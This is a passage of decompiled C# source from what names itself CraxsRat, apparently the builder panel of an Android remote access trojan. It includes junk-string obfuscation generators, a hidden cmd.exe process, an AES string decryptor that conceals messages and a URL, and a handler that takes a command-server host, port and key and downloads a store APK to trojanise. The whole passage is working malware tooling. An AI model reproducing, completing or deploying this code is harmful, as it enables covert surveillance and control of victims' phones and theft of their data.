		return Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(RandomShit(400, 1000), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), RandommMad(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), RandomShit(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), RandommMad(400, 1000)));
	}

	public string RandommMad(int minCharacters, int maxCharacters)
	{
		string text = "诶杰艾诶比伊哦诶诶娜西艾哦吉娜ثشقلسيقفالاسفلىسغ弗艾吉乃モ匕丹丹ち匚下尺ˉˏʾˎᵔٴיﹶﾞˋˈⁱـˎˋˋʿˎʿʿﹶˉˋᴵʻʼˑᵢʾʻʾᴵʿᵢʾᵢﹳʾᴵיˉᵎʼﹳʾʾᵢˆʽˎʿˊʾˈᵔʽᵎʼיⁱʾᐧﹶיˋˏᵎˋٴˈˑٴʻᵔˎʻˎʼˑᵢʾʻʾᴵʿיʼᐧˑʼˈˈיـˏᵢـٴˎʿˆʻˏʿᵎﾞˏﹶˎﹳʾʿˋᵢـʿᴵٴˎﾞˏٴٴᵎᵎٴᐧʾﹶٴـٴᵔˎᵢᵢᵔיᵔˏ匕尺عنبغعناتىةىاعخل下ㄚ工ㄥ∪工Ｊれ尺匕卄ちム下∨";
		if (rshit == null)
		{
			rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[rshit.Next(0, text.Length - 1)]);
			}
			cou3++;
			return text2.ToString().ToLower() + Conversions.ToString(cou3);
		}
	}

	private void Close_cmd()
	{
		try
		{
			Application.ExitThread();
			NewLateBinding.LateCall(CMD, null, "CancelOutputRead", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "CancelErrorRead", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "Kill", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "Close", new object[0], null, null, null, IgnoreReturn: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private bool CMD_running()
	{
		bool result;
		try
		{
			CMD = new Process();
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardOutput", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardInput", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "FileName", new object[1] { "cmd.exe" }, null, null, OptimisticSet: false, RValueBase: true);
			((Process)CMD).OutputDataReceived += Sync_Output;
			((Process)CMD).ErrorDataReceived += Sync_Output;
			((Process)CMD).Exited += [SpecialName] [DebuggerHidden] (object sender, EventArgs e) =>
			{
				ex();
			};
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "UseShellExecute", new object[1] { false }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "CreateNoWindow", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSet(CMD, null, "EnableRaisingEvents", new object[1] { true }, null, null);
			NewLateBinding.LateCall(CMD, null, "Start", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "BeginOutputReadLine", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "BeginErrorReadLine", new object[0], null, null, null, IgnoreReturn: true);
			result = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void DeleteDirectory(string target_dir)
	{
		string[] files = Directory.GetFiles(target_dir);
		string[] directories = Directory.GetDirectories(target_dir);
		string[] array = files;
		foreach (string path in array)
		{
			File.SetAttributes(path, FileAttributes.Normal);
			File.Delete(path);
		}
		string[] array2 = directories;
		foreach (string target_dir2 in array2)
		{
			DeleteDirectory(target_dir2);
		}
		Directory.Delete(target_dir, recursive: false);
	}

	public string GetDriv()
	{
		string result;
		try
		{
			string[] separator = new string[1] { "\\" };
			string[] array = Application.StartupPath.Split(separator, StringSplitOptions.RemoveEmptyEntries);
			result = array[0].ToString() + "\\";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = "C:\\";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private string D(string v)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(v));
	}

	public string CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(string text, string password)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(password));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(text);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		workpanel.SendToBack();
		showworkbtn.Visible = true;
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void b_ok_click(object sender, EventArgs e)
	{
	}

	private void Showworkbtn_Click(object sender, EventArgs e)
	{
		workpanel.BringToFront();
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(reso.Storepath + "\\Downloads"))
			{
				Directory.CreateDirectory(reso.Storepath + "\\Downloads");
			}
			Process.Start(reso.Storepath + "\\Downloads");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwefghcvbeefrw(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(Host.Text) | string.IsNullOrWhiteSpace(Host.Text))
		{
			Codes.MyMsgBox("Complete info", "Please enter Host or ip first.", useno: false, Resources.warning48px);
		}
		else if (string.IsNullOrEmpty(Port.Text) | string.IsNullOrWhiteSpace(Port.Text))
		{
			Codes.MyMsgBox("Complete info", "Please enter port first.", useno: false, Resources.warning48px);
		}
		else if (string.IsNullOrEmpty(TheKey.Text) | string.IsNullOrWhiteSpace(TheKey.Text))
		{
			Codes.MyMsgBox("Complete info", "Please enter Key first.", useno: false, Resources.warning48px);
		}
		else
		{
			if (!Codes.MyMsgBox("Check", "Confirm?  Host: " + Host.Text + "   Port: " + Port.Text + "   Key:" + TheKey.Text, useno: true, Resources.sucess48px))
			{
				return;
			}
			try
			{
				if (DGVSTORE.SelectedRows.Count > 0)
				{
					if (downloadworker.IsBusy)
					{
						Codes.MyMsgBox("Downlaod working", "Wait for download to finish", useno: false, Resources.error48px);
						return;
					}
					string[] array = (string[])DGVSTORE.SelectedRows[0].Tag;
					List<string> list = new List<string>();
					list.Add(array[0]);
					list.Add(array[1]);
					list.Add(array[2]);
					list.Add(array[3]);
					list.Add(ComboPrims.Text);
					list.Add((string)DGVSTORE.SelectedRows[0].Cells[1].Value);
					workimage.Image = (Image)DGVSTORE.SelectedRows[0].Cells[0].Value;
					worklabel.Text = (string)DGVSTORE.SelectedRows[0].Cells[1].Value + "   " + (string)DGVSTORE.SelectedRows[0].Cells[2].Value + "   " + (string)DGVSTORE.SelectedRows[0].Cells[4].Value;
					worklog.Text = "";
					downloadworker.RunWorkerAsync(list);
					workpanel.BringToFront();
				}
				else
				{
					Codes.MyMsgBox("complete info", "Select apk from store", useno: false, Resources.error48px);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Codes.MyMsgBox("Connection error 2", "Can't connect to server please try again later", useno: false, Resources.error48px);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatswefzxcuyhg(object sender, EventArgs e)
	{
		try
		{
			if (Codes.MyMsgBox(CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf("akFzmqDQJzqmAe4q2R4qEQ==", "cameramanager"), CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf("u3761jA987VGWm7EmtpRLeelKohAd5KHo4yOIKHVNpT7mEVqg55GScpI0AsD9/h4lVzEyc2kYZdY\r\npIy5R0m1Ang2iTmSozQhV0OXHd7UtLM=", "BringToFront"), useno: true, Resources.error48px))
			{
				Process.Start(CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf("AfMdfgfTCG3fswubvIb1hJvGvTc5x/tGPN1F2dY358w=", "res/config"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DGVSTORE_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if (DGVSTORE.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGVSTORE.Rows.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					if (Operators.ConditionalCompareObjectEqual(DGVSTORE.Rows[i].Cells[6].Value, true, TextCompare: false))
					{
						DGVSTORE.Rows[i].Cells[6].Value = false;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			DGVSTORE.SelectedRows[0].Cells[6].Value = true;
		}
	}
}
